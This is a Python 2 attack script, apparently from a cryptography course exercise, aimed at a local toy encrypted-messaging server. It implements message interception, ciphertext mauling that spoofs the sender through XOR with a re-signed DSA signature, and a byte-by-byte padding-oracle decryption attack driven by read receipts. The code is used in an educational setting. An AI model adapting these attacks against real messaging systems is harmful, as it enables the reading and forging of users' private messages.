import requests, json

import sched, time

from Crypto import Random
from Crypto.Cipher import PKCS1_v1_5
from Crypto.Hash import SHA
from Crypto.PublicKey import RSA
from M2Crypto import DSA
import M2Crypto, binascii

from base64 import b64decode
import base64
import os


global url, headers
server = '127.0.0.1'
port = '80'
url = {}
headers = {}

#Logging
import logging
logging.basicConfig(format='[%(levelname)s]: %(message)s', level=logging.INFO)

#global variable for Part 1
global intercepted_msg
intercepted_msg = False

s = sched.scheduler(time.time, time.sleep)

#UTILITY methods
def unpad(s):
	return s[0:-ord(s[-1])]

def encodeBase64(s):
	return base64.b64encode(s)

def decodeBase64(strBase64):
	return base64.b64decode(strBase64)

def retrieveKey(KEY, mode):
	if mode == 'RSA':
		return KEY.split("%")[0]
	else:
		return KEY.split("%")[1]

def retrieveCiphertext(cipher, n):
	return cipher.split(" ")[n]

def xor(s1,s2):    
	return ''.join(chr(ord(a) ^ ord(b)) for a,b in zip(s1,s2))

def hex2ascii(h):
	return (h.split("x")[1]).decode('hex')

def writeToFile(filename, contents):
	f = open(filename,'w')
	f.write(contents)
	f.close()

def createPEM(key):
	header = '-----BEGIN PUBLIC KEY-----\n'
	footer = '\n-----END PUBLIC KEY-----'
	key_pem = header + key + footer
	return key_pem

def deleteFile(filename):
	os.remove(filename)


#REST methods
def setupNetworkStrings(server, port):

	if 'http' in server:
		host = server+':'+port
	else:
		host = 'http://'+server+':'+port

	url['lookupUsers'] = host+'/lookupUsers'
	url['lookupKey'] = host+'/lookupKey/'
	url['registerKey'] = host+'/registerKey/'
	url['getMessages'] = host+'/getMessages/'
	url['sendMessage'] = host+'/sendMessage/'
	headers['content-type'] = 'application/json'

def lookupKey(username):
	r = requests.get(url['lookupKey']+str(username))
	return r

def lookupUsers():
	users = requests.get(url['lookupUsers'], headers=headers)
	for i in range(users.json()["numUsers"]):
		print '%d : %s' %(i, users.json()["users"][i])

def registerKey(PUBLIC_KEY, user):
	payload = {}
	payload['keyData'] = str(PUBLIC_KEY)
	r = requests.post(url['registerKey']+str(user), data=json.dumps(payload), headers=headers)
	if r.json()["result"] == 1:
		logging.info('Successfully registered a public key for %s .' % user)
	else:
		logging.error('Failed to register a public key for %s .' % user)

def getMessages(user):
	r = requests.get(url['getMessages']+str(user), headers=headers)
	return r

def sendMSG(msgID, cipherText, suser, ruser):
	payload = {}
	payload['recipient'] = ruser
	payload['messageID'] = msgID
	payload['message'] = cipherText
	
	r = requests.post(url['sendMessage']+suser, data=json.dumps(payload), headers=headers)
	if r.json()["result"] == 1:
		logging.info('Message sent.')
	else:
		logging.error('Failed to send message')

#CRYPTO methods

def computeSHA1(content):
	hashObj = SHA.new()
	hashObj.update(content)
	return hashObj.digest()

def rsaKeyGen(user):
	rsa_key = RSA.generate(1024)
	rsa_public_key = rsa_key.publickey().exportKey('DER')

	#write rsa private key to file
	filename_rsa = '%s_rsa_key.der' % user
	writeToFile(filename_rsa, rsa_key.exportKey('DER'))

	return base64.b64encode(rsa_public_key)

def dsaKeyGen(user):
	dsa = DSA.gen_params(1024)
	dsa.gen_key()
	filename_dsa_private = '%s_dsa_private.pem' % user
	dsa.save_key(filename_dsa_private, cipher=None)
	filename_dsa_public = '%s_dsa_public.pem' % user
	dsa.save_pub_key(filename_dsa_public)

	lines_list_nonewline = []
	lines_list = open(filename_dsa_public).readlines()
	for i in lines_list:
		lines_list_nonewline.append(i.rstrip('\n'))
		
	return ''.join(lines_list_nonewline[1:-1])

def genKeys(adversary):
	logging.info('Generating a new keypair for %s' % adversary)
	rsa_public_key_base64 = rsaKeyGen(adversary)
	dsa_public_key_base64 = dsaKeyGen(adversary)
	PUBLIC_KEY = rsa_public_key_base64 + '%' + dsa_public_key_base64
	registerKey(PUBLIC_KEY, adversary)

def generateSignature(message, user):
	filename_dsa_private = '%s_dsa_private.pem' % user
	dsa = DSA.load_key(filename_dsa_private)
	cipher_preDSA_hash = computeSHA1(message)
	return dsa.sign_asn1(cipher_preDSA_hash)

def verifySignature(key, message, signature):
	key_pem = createPEM(key)
	filename = 'sender_dsa_key.pem'
	writeToFile(filename, key_pem)
	message_base64_hash = computeSHA1(message)
	dsa = DSA.load_pub_key(filename)
	verification = dsa.verify_asn1(message_base64_hash, signature)
	deleteFile(filename)
	return verification

def rsaDecryption(user, cipher):
	rsa_privatekey_filename = '%s_rsa_key.der'%user
	f_rsa_pem = open(rsa_privatekey_filename,'r')
	rsaKey = RSA.importKey(f_rsa_pem.read())

	dsize = SHA.digest_size
	sentinel = Random.new().read(0+dsize)
	cipher1 = PKCS1_v1_5.new(rsaKey)
	return cipher1.decrypt(cipher, sentinel)

def aesDecryption( key, ciphertext, iv):
	cryptor = M2Crypto.EVP.Cipher( alg='aes_128_ctr', key=key, iv=iv, op=0)
	ret = cryptor.update( ciphertext )
	ret = ret + cryptor.final()
	return ret

def verifyCRC(msg_crc):
	msg_formatted = msg_crc[:-4]
	crc_old = msg_crc[-4:]
	crc_new = binascii.crc32(msg_formatted)
	crc_new = binascii.unhexlify('%08X' % (crc_new & 0xffffffff))

	if crc_old != crc_new:
		print False
	else:
		return True

def decrypt(cipher, sender, msgID, user):

	key_request = lookupKey(sender)
	KEY = key_request.json()['keyData']
	
	message = 'No new messages.'
	
	#1
	dsaKey = retrieveKey(KEY, 'DSA')

	#2
	ciphertext1_base64 = retrieveCiphertext(cipher, 0).encode('utf-8')
	ciphertext2_base64 = retrieveCiphertext(cipher, 1).encode('utf-8')
	message_base64 = (" ".join(cipher.split(" ")[:2])).encode('utf-8')
	signature_base64 = retrieveCiphertext(cipher, 2).encode('utf-8')

	#3
	ciphertext1 = decodeBase64(ciphertext1_base64)
	ciphertext2 = decodeBase64(ciphertext2_base64)
	signature = decodeBase64(signature_base64)

	#4    
	signature = verifySignature(dsaKey, message_base64, signature)
	if not signature:
		message = 'BAD SIGNATURE'
		return message

	#5
	plaintext1_aes_key = rsaDecryption(user, ciphertext1)

	#6
	iv = ciphertext2[:16]
	
	ciphertext2 = ciphertext2[16:]
	msg_padded = aesDecryption(plaintext1_aes_key, ciphertext2, iv)

	#7
	msg_crc = unpad(msg_padded)

	#8
	msg_formatted = msg_crc[:-4]

	crc = verifyCRC(msg_crc)   
	if not crc:
		message = 'BAD CRC'
		return message
	
	#9
	sender_userid = msg_formatted.split(":")[0]

	if sender_userid != sender:
		message = 'BAD USER'
		return message
	else:
		message = msg_formatted.split(":")[1]

	#10 - Output M
	return message

#MISC

def get_padlen(adversary):
	first_pass_read_rcpts = getMessages(adversary)

	global padlen
	padlen = 16

	if first_pass_read_rcpts.json()['numMessages'] > 0:
		for i in range(first_pass_read_rcpts.json()['numMessages']):
			sender = first_pass_read_rcpts.json()['messages'][i]['senderID']
			cipher = first_pass_read_rcpts.json()['messages'][i]['message']
			msgID = first_pass_read_rcpts.json()['messages'][i]['messageID']

			read_rcpt = decrypt(cipher, sender, msgID, adversary)
			logging.info('Received read reciept: %s' % read_rcpt)

			if padlen>int(read_rcpt.split(" ")[1]):
				padlen = int(read_rcpt.split(" ")[1])

	print 'PAD LENGTH = %d' % padlen

def get_current_bit(adversary):

	read_rcpts = getMessages(adversary)

	global last_bit_changed
	last_bit_changed = False

	global current_bit
	current_bit = 99900

	if read_rcpts.json()['numMessages'] > 0:
		for i in range(read_rcpts.json()['numMessages']):
			sender = read_rcpts.json()['messages'][i]['senderID']
			cipher = read_rcpts.json()['messages'][i]['message']
			msgID = read_rcpts.json()['messages'][i]['messageID']

			read_rcpt = decrypt(cipher, sender, msgID, adversary)
			logging.info('Received read reciept: %s' % read_rcpt)

			if current_bit>int(read_rcpt.split(" ")[1]):
				current_bit = int(read_rcpt.split(" ")[1])
				current_bit = current_bit/100
	else:
		last_bit_changed = True

	logging.info('Byte decrypted: %02X' % current_bit)

def format_padded_cipher(cipher, padlength, plaintext):

	ciphertext1_base64 = retrieveCiphertext(cipher, 0).encode('utf-8')
	ciphertext2_base64 = retrieveCiphertext(cipher, 1)
	signature_base64 = retrieveCiphertext(cipher, 2).encode('utf-8')

	ciphertext2 = decodeBase64(ciphertext2_base64)	
	last_position = len(ciphertext2)-1

	for i in range(len(plaintext)):
		new_padlen = chr(plaintext[i] ^ (padlength+1))
		ciphertext2 = ciphertext2[:last_position-i] + xor(ciphertext2[last_position-i], new_padlen) + ciphertext2[last_position-(i-1):]

	ciphertext2_base64 = encodeBase64(ciphertext2)
	padded_cipher = ciphertext1_base64 + " " + ciphertext2_base64 + " " + signature_base64

	return padded_cipher

def print_HEX(plain_num):
	
	msg_hex = ''

	for i in plain_num:
		h = "%02X" % i
		msg_hex = msg_hex + ' ' + h[::-1]

	logging.info('Decrypted HEX: %s' % msg_hex[::-1])
	
def print_plaintext(plaintext):

	logging.info('PLAINTEXT: ')	
	plaintext.reverse()

	msg_padded = ''

	for i in plaintext:
		msg_padded = msg_padded + chr(i)

	msg_crc = unpad(msg_padded)
	message = msg_crc[:-4]

	if ':' in message:
		message = message.split(":")[1]

	print message

def strip_last_block(cipher):

	logging.info('Stripping last block')
	#Parse cipher
	ciphertext1_base64 = retrieveCiphertext(cipher, 0).encode('utf-8')
	ciphertext2_base64 = retrieveCiphertext(cipher, 1)
	signature_base64 = retrieveCiphertext(cipher, 2).encode('utf-8')

	#Strip last block
	ciphertext2 = decodeBase64(ciphertext2_base64)
	ciphertext2 = ciphertext2[:-16]
	ciphertext2_base64 = encodeBase64(ciphertext2)

	#Reconstruct cipher
	cipher = ciphertext1_base64 + " " + ciphertext2_base64 + " " + signature_base64

	return cipher

#EXPLOIT methods
#Part 3
def attack(msgID, cipher, sender, recipient, xor_char, xor_pos, isPass1):

		logging.info('Querying Byte: %02X' % xor_char)

		#Parse cipher
		ciphertext1_base64 = retrieveCiphertext(cipher, 0).encode('utf-8')
		ciphertext2_base64 = retrieveCiphertext(cipher, 1)
		ciphertext2 = decodeBase64(ciphertext2_base64)

		#Maul sender ID
		if sender is 'a':
			ciphertext2_base64 = encodeBase64(ciphertext2[:17] + xor(ciphertext2[17], '\x56') + ciphertext2[18:])
		else:
			ciphertext2_base64 = encodeBase64(ciphertext2[:17] + xor(ciphertext2[17], '\x55') + ciphertext2[18:])
		
		#Maul message
		ciphertext2 = decodeBase64(ciphertext2_base64)

		#Get index of last position of C2
		last_position = len(ciphertext2)-1

		if isPass1:
			ciphertext2_base64 = encodeBase64(ciphertext2[:last_position-xor_pos] + xor(ciphertext2[last_position-xor_pos], str(xor_char)) + ciphertext2[last_position-(xor_pos-1):])
		else:
			if xor_pos == 0:
				xor_char1 = chr(xor_char)
				ciphertext2_base64 = encodeBase64(ciphertext2[:last_position-xor_pos] + xor(ciphertext2[last_position-xor_pos], xor_char1) + ciphertext2[last_position-(xor_pos-1):])
			else:
				xor_char1 = chr(xor_char ^ (xor_pos+1))
				ciphertext2_base64 = encodeBase64(ciphertext2[:last_position-xor_pos] + xor(ciphertext2[last_position-xor_pos], xor_char1) + ciphertext2[last_position-(xor_pos-1):])
			
		#Recompute signature
		cipher_preDSA = (ciphertext1_base64 + " " + ciphertext2_base64)
		signature_adversary = generateSignature(cipher_preDSA, sender)
		signature_adversary_base64 = base64.b64encode(signature_adversary)

		#Prepare 
		cipher_mauled = ciphertext1_base64 + " " + ciphertext2_base64 + " " + signature_adversary_base64
		
		logging.info('Sending Mauled query message to: %s' % recipient)
		s.enter(0.3, 1, sendMSG, (msgID, cipher_mauled, sender, recipient,))
		s.run()


def exploit(recipient):

	msg = getMessages(recipient)

	if msg.json()['numMessages'] > 0:

		global intercepted_msg
		intercepted_msg = True
		for i in range(msg.json()['numMessages']):
			sender = msg.json()['messages'][i]['senderID']
			msgID = msg.json()['messages'][i]['messageID']
			cipher = msg.json()['messages'][i]['message']

			logging.info('Intercepted encrypted message from %s' % sender)
			logging.info('Message ID of intercepted message: %d' % msgID)

			logging.info('Intercepted message:')
			print '%s\n' % cipher

			#Set adversary name and generate keys
			adversary = ''
			if msg.json()['messages'][i]['senderID'] == 'alice1':
				adversary = 'a'
			else:
				adversary = 'b'
			genKeys(adversary)

			number_of_blocks = len(retrieveCiphertext(cipher, 1))/16
			
			#get msgs for 'adversary' to clear pending msg rcpts on server
			getMessages(adversary)

			msgID = 0
			#1st Pass to determine padding length:
			for xor_pos in range(16):
				xor_char = 01
				msgID = xor_pos
				attack(msgID, cipher, adversary, recipient, xor_char, xor_pos, True) #TODO: REMOVE

			logging.info('waiting to receive read reciepts...')
			s.enter(10, 1, get_padlen, (adversary,))
			s.run()

			global padlen
			logging.info('Padding length determined: %d' % padlen)
			
			plaintext = []

			for i in range(number_of_blocks-1):

				decrypted_block = []

				if padlen != 0:
					for i in range(padlen):
						decrypted_block.append(padlen)
						plaintext.append(padlen)

				for xor_pos in range(padlen, 16):

					#get msgs for 'adversary' to clear pending msg rcpts on server
					getMessages(adversary)

					padded_cipher = format_padded_cipher(cipher, xor_pos, decrypted_block)

					for xor_char in range(256):
						print_HEX(plaintext)
						msgID = xor_char*100
						attack(msgID, padded_cipher, adversary, recipient, xor_char, xor_pos, False)
					
					logging.info('waiting to receive read reciepts...')
					s.enter(20, 1, get_current_bit, (adversary,))
					s.run()

					global last_bit_changed
					if last_bit_changed:
						logging.critical('No Read reciept received')

						if xor_pos == 1:
							new_bit = plaintext[len(plaintext)-1] + 1
							
							del plaintext[-1]
							del decrypted_block[-1]

							global current_bit
							plaintext.append(new_bit)
							decrypted_block.append(new_bit)

							#get msgs for 'adversary' to clear pending msg rcpts on server
							getMessages(adversary)

							padded_cipher = format_padded_cipher(cipher, xor_pos, decrypted_block)

							for xor_char in range(256):
								if xor_char%8 == 0:
									print_HEX(plaintext)
								msgID = xor_char*100
								attack(msgID, padded_cipher, adversary, recipient, xor_char, xor_pos, False)
						
							logging.info('waiting to receive read reciepts...')
							s.enter(20, 1, get_current_bit, (adversary,))
							s.run()
						else:
							#Error in decryption
							logging.info('Finished decryption')
							print_HEX(plaintext)
							print_plaintext(plaintext)
							return 0

					global current_bit
					plaintext.append(current_bit)
					decrypted_block.append(current_bit)
				
				#Strip last block and set padding to 0
				logging.info('Block decrypted:')
				print_HEX(plaintext)
				padlen = 0
				cipher = strip_last_block(cipher)

			#Decryption complete
			logging.info('Decryption complete!')
			print_HEX(plaintext)
			print_plaintext(plaintext)


#Part 2
def maul(recipient):
	
	#Get message for recipient
	msg = getMessages(recipient)

	if msg.json()['numMessages'] > 0:

		global intercepted_msg
		intercepted_msg = True

		for i in range(msg.json()['numMessages']):

			#Parse message
			sender = msg.json()['messages'][i]['senderID']
			msgID = msg.json()['messages'][i]['messageID']
			cipher = msg.json()['messages'][i]['message']

			logging.info('Intercepted encrypted message from %s' % sender)
			logging.info('Message ID of intercepted message: %d' % msgID)

			logging.info('Mauling encypted message with messageID %d' % msgID)
			
			#Set adversary name and generate keys
			adversary = ''
			if 'a' in msg.json()['messages'][i]['senderID']:
				adversary = 'a'
			else:
				adversary = 'b'

			#Generate keys for adversary
			genKeys(adversary)
			
			#Parse ciphertext
			ciphertext1_base64 = retrieveCiphertext(cipher, 0).encode('utf-8')
			ciphertext2_base64 = retrieveCiphertext(cipher, 1)

			#Base64 decode ciphertext
			ciphertext1 = decodeBase64(ciphertext1_base64)
			ciphertext2 = decodeBase64(ciphertext2_base64)

			#Maul adversary ID
			if adversary is 'a':
				ciphertext2_base64 = encodeBase64(ciphertext2[:17] + xor(ciphertext2[17], '\x56') + ciphertext2[18:])
			else:
				ciphertext2_base64 = encodeBase64(ciphertext2[:17] + xor(ciphertext2[17], '\x55') + ciphertext2[18:])
			
			#Maul message
			ciphertext2 = decodeBase64(ciphertext2_base64)
			ciphertext2_base64 = encodeBase64(ciphertext2[:26] + xor(ciphertext2[26], '\x04') + ciphertext2[27:])
			
			#Recompute signature for adversary
			cipher_preDSA = (ciphertext1_base64 + " " + ciphertext2_base64)
			signature_adversary = generateSignature(cipher_preDSA, adversary)
			signature_adversary_base64 = base64.b64encode(signature_adversary)

			#Prepare mauled message
			cipher_mauled = ciphertext1_base64 + " " + ciphertext2_base64 + " " + signature_adversary_base64
			
			#Send mauled message
			logging.info('Sending Mauled message from %s' % adversary)
			sendMSG(msgID, cipher_mauled, adversary, recipient)

#Part 1
def intercept(recipient):

	#Get message for recipient
	msg = getMessages(recipient)

	if msg.json()['numMessages'] > 0:

		global intercepted_msg
		intercepted_msg = True

		for i in range(msg.json()['numMessages']):

			#Parse message
			sender = msg.json()['messages'][i]['senderID']
			msgID = msg.json()['messages'][i]['messageID']
			cipher = msg.json()['messages'][i]['message']

			#Print intercepted cipher/message
			logging.info('Intercepted encrypted message from %s' % sender)
			logging.info('Message ID of intercepted message: %d' % msgID)
			logging.info('Cipher:\n%s' % cipher)
			logging.info('sending intercepted message to recipient')
			
			#Forward intercepted message to original recipient
			sendMSG(msgID, cipher, sender, recipient)

#Part0
def sniffer(recipient, mode):

	logging.info('listening for messages to %s' % recipient)
	global intercepted_msg
	
	while 1==1:
		if not intercepted_msg:

			if mode == 1:
				s.enter(0.5, 1, maul, (recipient, ))
				s.run()	
			elif mode == 2:
				s.enter(0.5, 1, exploit, (recipient, ))
				s.run()
			else:
				s.enter(0.5, 1, intercept, (recipient, ))
				s.run()
		else:
			intercepted_msg = False
			return 0

#MAIN
if __name__ == "__main__":

	setupNetworkStrings(server, port)

	while 1==1:
		option = raw_input('\n> ')

		if 'intercept ' in option:
			sniffer(option.split(" ")[1], 0)

		elif 'maul ' in option:
			sniffer(option.split(" ")[1], 1)

		elif 'exploit ' in option:
			print 'Choose exploit method: '
			print '1. Enter ciphertext to decrypt'
			print '2. Intercept next ciphertext and decrypt'
			exploit_method = raw_input('method> ')

			if exploit_method == 1:
				sniffer(option.split(" ")[1], 2)
			else:
				sniffer(option.split(" ")[1], 2)

		else:
			print 'Usuage: '
			print 'intercept <user>'
			print 'maul <user>'
			print 'exploit <user>'
	




